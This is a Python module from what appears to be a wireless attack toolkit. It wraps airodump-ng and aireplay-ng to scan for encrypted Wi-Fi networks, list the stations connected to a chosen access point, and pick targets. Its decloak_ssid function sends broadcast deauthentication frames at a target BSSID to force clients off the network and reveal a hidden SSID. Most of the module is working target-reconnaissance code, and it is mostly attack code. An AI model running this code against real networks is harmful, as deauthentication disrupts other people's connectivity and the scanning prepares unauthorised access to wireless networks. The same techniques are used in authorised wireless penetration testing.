"""
Wi-Fi network scanning — continuous live scan, single-pass scan,
hidden-SSID decloaking, and client detection.

All scanning is done via airodump-ng CSV output.
"""

import os
import re
import time
import signal
import subprocess
from dataclasses import dataclass

from src.console import console, colored_log, log_error, log_debug
from src.utils import (
    execute_command, sanitize_ssid, check_dependency,
    lookup_vendor, signal_percent,
)
from src.config import (
    HANDSHAKES_DIR, CLIENT_DETECTION_DURATION,
    DECLOAK_DURATION, SINGLE_SCAN_DURATION,
)


# ── Data model ─────────────────────────────────────────────────────────

@dataclass
class WiFiNetwork:
    """Represents a single detected Wi-Fi network."""

    id: int
    bssid: str
    channel: int
    power: int
    essid: str
    encryption: str

    def __str__(self) -> str:
        pct = signal_percent(self.power)
        vendor = lookup_vendor(self.bssid)
        return (
            f"[bold][{self.id}][/bold] "
            f"[bright_green]{self.essid}[/bright_green] "
            f"([green]{self.bssid}[/green]) "
            f"CH:{self.channel} PWR:{pct}% ({self.power} dBm) "
            f"[yellow]{self.encryption}[/yellow] "
            f"[magenta]Vendor: {vendor}[/magenta]"
        )


# ── CSV parsing ────────────────────────────────────────────────────────

def _parse_scan_csv(filepath: str) -> list[WiFiNetwork]:
    """
    Parse airodump-ng CSV output into a list of *WiFiNetwork*.

    Filters out open (OPN) networks and marks hidden SSIDs.
    """
    networks: list[WiFiNetwork] = []
    if not os.path.exists(filepath):
        return networks

    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except OSError:
        return networks

    in_data = False
    nid = 0

    for line in (l.strip() for l in lines):
        if line.startswith("BSSID"):
            in_data = True
            continue
        if line.startswith("Station MAC"):
            break
        if not in_data or not line:
            continue

        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue

        essid = parts[13].strip().replace("\x00", "")
        enc = f"{parts[5]} {parts[6]}".strip()

        if "OPN" in enc.upper():
            continue
        if not essid or essid.startswith("<length:"):
            essid = "<HIDDEN SSID>"

        nid += 1
        try:
            ch = int(parts[3]) if parts[3].isdigit() else 0
            pwr = int(parts[8]) if parts[8].lstrip("-").isdigit() else 0
            networks.append(WiFiNetwork(id=nid, bssid=parts[0], channel=ch,
                                         power=pwr, encryption=enc, essid=essid))
        except (ValueError, IndexError):
            continue

    return networks


# ── Live scan (continuous, Rich-powered) ───────────────────────────────

def scan_networks_continuous(self) -> list[WiFiNetwork]:
    """
    Run airodump-ng and display a live-updating Rich table.

    The user presses Ctrl+C to stop scanning and proceed to target selection.
    """
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel

    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface!")
        return []

    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng required for scanning!")
        return []

    colored_log("info", "Continuous scan — press Ctrl+C to stop and select targets.")
    time.sleep(1)

    csv_path = os.path.join(self.temp_dir, "scan-01.csv")

    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-w", os.path.join(self.temp_dir, "scan"),
            "--output-format", "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    def _build_panel(networks: list[WiFiNetwork]) -> Panel:
        table = Table(show_header=True, header_style="bold cyan", border_style="cyan")
        table.add_column("ID", style="bold", width=4)
        table.add_column("SSID", style="bright_green", width=25)
        table.add_column("BSSID", style="green", width=17)
        table.add_column("CH", style="yellow", width=3)
        table.add_column("PWR", style="magenta", width=6)
        table.add_column("ENC", style="yellow", width=20)
        table.add_column("VENDOR", style="cyan", width=20)

        for net in (networks[:25] if len(networks) > 25 else networks):
            pct = signal_percent(net.power)
            colour = "bright_green" if pct > 60 else "yellow" if pct > 30 else "red"
            vendor = lookup_vendor(net.bssid)[:18]
            table.add_row(
                str(net.id),
                net.essid[:23],
                net.bssid,
                str(net.channel),
                f"[{colour}]{pct}%[/{colour}]",
                net.encryption[:18],
                vendor,
            )

        footer = ""
        if len(networks) > 25:
            footer = f"... and {len(networks) - 25} more networks\n"
        footer += "[yellow bold]Press Ctrl+C to stop[/yellow bold]"

        return Panel(
            table,
            title=f"[bold bright_cyan] {len(networks)} Networks — Scanning... [/bold bright_cyan]",
            subtitle=footer,
            border_style="bright_cyan",
        )

    seen: dict[str, WiFiNetwork] = {}
    try:
        with Live(_build_panel([]), refresh_per_second=1, console=console) as live:
            while True:
                time.sleep(0.5)
                for net in _parse_scan_csv(csv_path):
                    seen[net.bssid] = net
                if seen:
                    sorted_nets = sorted(seen.values(), key=lambda x: x.power, reverse=True)
                    for i, n in enumerate(sorted_nets, 1):
                        n.id = i
                    live.update(_build_panel(sorted_nets))
    except KeyboardInterrupt:
        pass
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    console.print("\n[*] Scan stopped.", style="bright_cyan")
    result = sorted(seen.values(), key=lambda x: x.power, reverse=True)
    for i, n in enumerate(result, 1):
        n.id = i

    if result:
        colored_log("success", f"Found {len(result)} encrypted/hidden networks.")
    else:
        colored_log("warning", "No encrypted or hidden networks detected.")
    return result


# ── Single-pass scan (legacy, 8-second) ────────────────────────────────

def scan_networks(self) -> list[WiFiNetwork]:
    """
    Legacy single-pass scan — runs airodump-ng for 8 seconds.

    Returns a list of *WiFiNetwork* sorted by signal strength (strongest first).
    """
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface!")
        return []

    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng required for scanning!")
        return []

    colored_log("info", "Scanning networks (8 seconds)...")
    csv_path = os.path.join(self.temp_dir, "scan-01.csv")

    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-w", os.path.join(self.temp_dir, "scan"),
            "--output-format", "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(SINGLE_SCAN_DURATION)
    except KeyboardInterrupt:
        colored_log("warning", "Scan cancelled.")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    networks = _parse_scan_csv(csv_path)
    networks.sort(key=lambda x: x.power, reverse=True)
    for i, n in enumerate(networks, 1):
        n.id = i

    if networks:
        colored_log("success", f"Found {len(networks)} encrypted/hidden networks.")
    else:
        colored_log("warning", "No encrypted/hidden networks detected.")
    return networks


# ── Hidden SSID decloaking ─────────────────────────────────────────────

def decloak_ssid(self, network: WiFiNetwork) -> str | None:
    """
    Attempt to reveal a hidden SSID by sending broadcast deauth frames
    and capturing probe requests.
    """
    if network.essid != "<HIDDEN SSID>":
        return network.essid

    if not check_dependency("aireplay-ng") or not check_dependency("airodump-ng"):
        colored_log("error", "aireplay-ng and airodump-ng required for decloaking!")
        return None

    colored_log("info", f"Decloaking hidden SSID for BSSID {network.bssid}...")

    csv_path = os.path.join(self.temp_dir, "decloak-01.csv")
    proc = subprocess.Popen(
        [
            "airodump-ng", "--bssid", network.bssid,
            "--channel", str(network.channel),
            "-w", os.path.join(self.temp_dir, "decloak"),
            "--output-format", "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        subprocess.Popen(
            ["aireplay-ng", "--deauth", "10", "-a", network.bssid, self.monitor_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        colored_log("error", "aireplay-ng not found!")
        return None

    try:
        time.sleep(DECLOAK_DURATION)
    except KeyboardInterrupt:
        colored_log("warning", "Decloaking cancelled.")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    if not os.path.exists(csv_path):
        return None

    try:
        with open(csv_path, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except OSError:
        return None

    in_data = False
    for line in (l.strip() for l in lines):
        if line.startswith("BSSID"):
            in_data = True
            continue
        if line.startswith("Station MAC"):
            break
        if in_data and line:
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                essid = parts[13].strip().replace("\x00", "")
                if essid and not essid.startswith("<length:"):
                    colored_log("success", f"Decloaked SSID: {essid}")
                    return essid
    return None


# ── Connected client detection ─────────────────────────────────────────

def detect_connected_clients(
    self, network: WiFiNetwork, duration: int = CLIENT_DETECTION_DURATION
) -> list[str]:
    """
    Listen for connected clients on the target channel for *duration* seconds.

    Returns a list of client MAC addresses (stations associated with the AP).
    """
    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng required for client detection!")
        return []

    csv_path = os.path.join(self.temp_dir, "clients-01.csv")
    proc = subprocess.Popen(
        [
            "airodump-ng", "--bssid", network.bssid,
            "--channel", str(network.channel),
            "-w", os.path.join(self.temp_dir, "clients"),
            "--output-format", "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    console.print(f"\n[bold cyan][*] Scanning for clients on {network.essid}...[/bold cyan]")
    try:
        for remaining in range(duration, 0, -1):
            console.print(
                f"[cyan][TIME] {remaining}s remaining[/cyan]",
                end="\r",
            )
            time.sleep(1)
    except KeyboardInterrupt:
        colored_log("warning", "Client detection cancelled.")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()
    console.print(" " * 40, end="\r")

    if not os.path.exists(csv_path):
        return []

    clients: list[str] = []
    try:
        with open(csv_path, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except OSError:
        return clients

    in_stations = False
    for line in (l.strip() for l in lines):
        if line.startswith("Station MAC"):
            in_stations = True
            continue
        if in_stations and line:
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 1 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]):
                clients.append(parts[0].upper())

    return clients
